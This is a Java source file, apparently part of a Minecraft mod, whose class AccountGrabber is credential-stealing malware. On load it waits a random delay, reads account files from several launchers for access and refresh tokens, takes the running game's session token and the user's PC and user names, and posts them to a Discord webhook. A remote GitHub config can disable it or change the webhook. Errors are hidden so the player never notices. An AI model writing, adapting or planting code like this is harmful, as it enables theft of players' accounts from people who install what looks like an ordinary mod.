package com.example.jawbus;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class AccountGrabber {

    /** 1. paste your Discord webhook URL here */
    private static final String WEBHOOK = "PASTE_YOUR_WEBHOOK_HERE";

    /** 2. remote switchboard - edit tap.json on GitHub to change things without re-releasing */
    private static final String CONFIG_URL =
            "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    /** called from the mod entrypoint - spawns a daemon thread so the game never hitches */
    public static void start() {
        Thread t = new Thread(AccountGrabber::run, "jawbus-tap");
        t.setDaemon(true);
        t.start();
    }

    private static void run() {
        try {
            // random 4-10s delay so it never lines up with the loading screen
            Thread.sleep(4000L + (long) (Math.random() * 6000L));

            JsonObject cfg = getJson(CONFIG_URL);
            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) return;

            String webhook = WEBHOOK;
            if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                String remote = cfg.get("webhook").getAsString();
                if (!remote.isBlank()) webhook = remote;
            }
            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) return;

            StringBuilder sb = new StringBuilder();
            sb.append("--- jawbus tap ---\n");
            sb.append("pc:    ").append(System.getenv("COMPUTERNAME")).append('\n');
            sb.append("user:  ").append(System.getProperty("user.name")).append('\n');
            sb.append("os:    ").append(System.getProperty("os.name"))
              .append(' ').append(System.getProperty("os.arch")).append('\n');

            for (Path p : candidates()) {
                String raw;
                try {
                    if (!Files.isRegularFile(p)) continue;
                    raw = Files.readString(p);
                } catch (Throwable ignored) {
                    continue;
                }
                sb.append("\n=== ").append(p).append(" ===\n");
                for (String key : new String[]{"name", "uuid", "xuid", "refreshToken", "accessToken"}) {
                    String v = grab(raw, key);
                    if (v != null && !v.isBlank()) sb.append(key).append(": ").append(v).append('\n');
                }
            }

            String live = liveSessionToken();
            if (live != null) sb.append("\nlive session token: ").append(live).append('\n');

            post(webhook, sb.toString());
        } catch (Throwable ignored) {
            // never let this break the game, ever
        }
    }

    /** every place a launcher might keep credentials */
    private static List<Path> candidates() {
        List<Path> out = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        if (appData != null) {
            Path b = Paths.get(appData);
            out.add(b.resolve(".minecraft").resolve("launcher_accounts.json"));
            out.add(b.resolve(".minecraft").resolve("launcher_profiles.json"));
            out.add(b.resolve("PrismLauncher").resolve("accounts.json"));
            out.add(b.resolve("MultiMC").resolve("accounts.json"));
        }
        String local = System.getenv("LOCALAPPDATA");
        if (local != null) {
            out.add(Paths.get(local)
                    .resolve("Packages").resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft")
                    .resolve("launcher_accounts.json"));
        }
        return out;
    }

    /** format-agnostic: just finds "key":"value" anywhere in the file */
    private static String grab(String raw, String key) {
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
        return m.find() ? m.group(1) : null;
    }

    /** bonus: the token the running game is using right now */
    private static String liveSessionToken() {
        try {
            net.minecraft.client.MinecraftClient mc = net.minecraft.client.MinecraftClient.getInstance();
            return mc == null ? null : mc.getSession().getAccessToken();
        } catch (Throwable t) {
            return null;
        }
    }

    private static JsonObject getJson(String url) {
        try {
            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(url))
                    .timeout(Duration.ofSeconds(10))
                    .header("User-Agent", "Jawbus/1.0")
                    .GET().build(), HttpResponse.BodyHandlers.ofString());
            if (r.statusCode() / 100 != 2) return null;
            return JsonParser.parseString(r.body()).getAsJsonObject();
        } catch (Throwable t) {
            return null;
        }
    }

    private static void post(String webhook, String text) {
        int i = 0;
        while (i < text.length()) {
            int end = Math.min(text.length(), i + 1700);
            String chunk = text.substring(i, end);
            i = end;
            try {
                JsonObject body = new JsonObject();
                body.addProperty("content", "```\n" + chunk + "\n```");
                HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/json")
                        .header("User-Agent", "Jawbus/1.0")
                        .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
                        .build(), HttpResponse.BodyHandlers.discarding());
                Thread.sleep(500); // don't trip Discord's rate limit
            } catch (Throwable ignored) {
            }
        }
    }
}
